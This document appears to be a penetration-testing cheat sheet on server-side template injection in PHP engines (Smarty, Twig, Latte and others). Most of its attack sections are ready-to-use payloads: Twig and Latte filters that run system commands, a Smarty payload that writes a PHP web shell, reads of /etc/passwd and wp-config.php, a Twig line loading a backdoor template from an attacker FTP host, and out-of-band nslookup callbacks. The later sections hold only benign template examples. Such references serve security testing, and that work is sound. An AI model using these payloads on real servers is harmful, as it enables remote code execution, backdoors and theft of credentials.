# server side template injection - php

> server-side template injection (ssti)  is a vulnerability that occurs when an attacker can inject malicious input into a server-side template, causing the template engine to execute arbitrary commands on the server. in php, ssti can arise when user input is embedded within templates rendered by templating engines like smarty, twig, or even within plain php templates, without proper sanitization or validation.


## summary

- [templating libraries](#templating-libraries)
- [smarty](#smarty)
- [twig](#twig)
    - [twig - basic injection](#twig---basic-injection)
    - [twig - template format](#twig---template-format)
    - [twig - arbitrary file reading](#twig---arbitrary-file-reading)
    - [twig - code execution](#twig---code-execution)
- [latte](#latte)
    - [latte - basic injection](#latte---basic-injection)
    - [latte - code execution](#latte---code-execution)
- [pattemplate](#pattemplate)
- [phplib](#phplib-and-html_template_phplib)
- [plates](#plates)
- [references](#references)


## templating libraries

| template name  | payload format |
| -------------- | --------- |
| laravel blade  | `{{ }}`   |
| latte          | `{var $x=""}{$x}`   |
| mustache       | `{{ }}`   |
| plates         | `<?= ?>`  |
| smarty         | `{ }`     |
| twig           | `{{ }}`   |


## smarty

[official website](https://www.smarty.net/docs/en/)
> smarty is a template engine for php.

```python
{$smarty.version}
{php}echo `id`;{/php} //deprecated in smarty v3
{smarty_internal_write_file::writefile($script_name,"<?php passthru($_get['cmd']); ?>",self::clearconfig())}
{system('ls')} // compatible v3
{system('cat index.php')} // compatible v3
```

---

## twig

[official website](https://twig.symfony.com/)
> twig is a modern template engine for php.

### twig - basic injection

```python
{{7*7}}
{{7*'7'}} would result in 49
{{dump(app)}}
{{dump(_context)}}
{{app.request.server.all|join(',')}}
```

### twig - template format

```python
$output = $twig > render (
  'dear' . $_get['custom_greeting'],
  array("first_name" => $user.first_name)
);

$output = $twig > render (
  "dear {first_name}",
  array("first_name" => $user.first_name)
);
```

### twig - arbitrary file reading

```python
"{{'/etc/passwd'|file_excerpt(1,30)}}"@
{{include("wp-config.php")}}
```

### twig - code execution

```python
{{self}}
{{_self.env.setcache("ftp://attacker.net:2121")}}{{_self.env.loadtemplate("backdoor")}}
{{_self.env.registerundefinedfiltercallback("exec")}}{{_self.env.getfilter("id")}}
{{['id']|filter('system')}}
{{[0]|reduce('system','id')}}
{{['id']|map('system')|join}}
{{['id',1]|sort('system')|join}}
{{['cat\x20/etc/passwd']|filter('system')}}
{{['cat$ifs/etc/passwd']|filter('system')}}
{{['id']|filter('passthru')}}
{{['id']|map('passthru')}}
{{['nslookup oastify.com']|filter('system')}}
```

example injecting values to avoid using quotes for the filename (specify via offset and length where the payload filename is)

```python
filename{% set var = dump(_context)[offset:length] %} {{ include(var) }}
```

example with an email passing filter_validate_email php.

```powershell
post /subscribe?0=cat+/etc/passwd http/1.1
email="{{app.request.query.filter(0,0,1024,{'options':'system'})}}"@attacker.tld
```

---

## latte

### latte - basic injection

```php
{var $x="poc"}{$x}
```

### latte - code execution

```php
{php system('nslookup oastify.com')}
```

---


## pattemplate

> [pattemplate](https://github.com/wernerwa/pat-template) non-compiling php templating engine, that uses xml tags to divide a document into different parts

```xml
<pattemplate:tmpl name="page">
  this is the main page.
  <pattemplate:tmpl name="foo">
    it contains another template.
  </pattemplate:tmpl>
  <pattemplate:tmpl name="hello">
    hello {name}.<br/>
  </pattemplate:tmpl>
</pattemplate:tmpl>
```

---

## phplib and html_template_phplib

[html_template_phplib](https://github.com/pear/html_template_phplib) is the same as phplib but ported to pear.

`authors.tpl`

```html
<html>
 <head><title>{page_title}</title></head>
 <body>
  <table>
   <caption>authors</caption>
   <thead>
    <tr><th>name</th><th>email</th></tr>
   </thead>
   <tfoot>
    <tr><td colspan="2">{num_authors}</td></tr>
   </tfoot>
   <tbody>
<!-- begin authorline -->
    <tr><td>{author_name}</td><td>{author_email}</td></tr>
<!-- end authorline -->
   </tbody>
  </table>
 </body>
</html>
```

`authors.php`

```php
<?php
//we want to display this author list
$authors = array(
    'christian weiske'  => 'cweiske@php.net',
    'bjoern schotte'     => 'schotte@mayflower.de'
);

require_once 'html/template/phplib.php';
//create template object
$t =& new html_template_phplib(dirname(__file__), 'keep');
//load file
$t->setfile('authors', 'authors.tpl');
//set block
$t->setblock('authors', 'authorline', 'authorline_ref');

//set some variables
$t->setvar('num_authors', count($authors));
$t->setvar('page_title', 'code authors as of ' . date('y-m-d'));

//display the authors
foreach ($authors as $name => $email) {
    $t->setvar('author_name', $name);
    $t->setvar('author_email', $email);
    $t->parse('authorline_ref', 'authorline', true);
}

//finish and echo
echo $t->finish($t->parse('out', 'authors'));
?>
```

---

## plates

plates is inspired by twig but a native php template engine instead of a compiled template engine.

controller:

```php
// create new plates instance
$templates = new league\plates\engine('/path/to/templates');

// render a template
echo $templates->render('profile', ['name' => 'jonathan']);
```

page template:

```php
<?php $this->layout('template', ['title' => 'user profile']) ?>

<h1>user profile</h1>
<p>hello, <?=$this->e($name)?></p>
```

layout template:

```php
<html>
  <head>
    <title><?=$this->e($title)?></title>
  </head>
  <body>
    <?=$this->section('content')?>
  </body>
</html>
```


## references

* [server side template injection (ssti) via twig escape handler - march 21, 2024](https://github.com/getgrav/grav/security/advisories/ghsa-2m7x-c7px-hp58)